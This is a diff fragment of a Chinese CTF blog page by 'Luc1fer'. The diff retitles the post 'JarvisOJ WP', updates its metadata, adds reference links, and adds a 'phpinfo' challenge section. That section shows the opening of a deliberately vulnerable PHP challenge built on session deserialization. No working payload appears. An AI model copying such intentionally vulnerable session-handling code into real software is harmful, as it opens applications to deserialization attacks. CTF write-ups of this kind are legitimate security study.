+webre()</code></pre><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>JarvisOJ上的题目，题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
 <pre><code>&lt;?php
 //A webshell is wait for you
 ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
@@ -690,6 +787,10 @@ echo serialize($a);
 <p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p>
 <p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p>
 </blockquote>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/2563#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2563#toc-2</a></p>
+<p><a href="https://www.jianshu.com/p/5342d07a6956" target="_blank" rel="noopener">https://www.jianshu.com/p/5342d07a6956</a><br><a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/69264.html</a></p>
+</blockquote>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 brainsemail@163.com </span>
@@ -703,12 +804,12 @@ echo serialize($a);
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Session_unserlize</p>
+    <p><span class="copy-title">文章标题:</span>JarvisOJ WP</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-01, 19:33:07</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-01, 19:53:15</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/01/session_unserialize/" title="Session_unserlize">https://github.com/BrainLyh/2019/08/01/session_unserialize/</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-01, 19:37:28</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-01, 19:58:33</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/01/JarvisOJ/" title="JarvisOJ WP">https://github.com/BrainLyh/2019/08/01/JarvisOJ/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
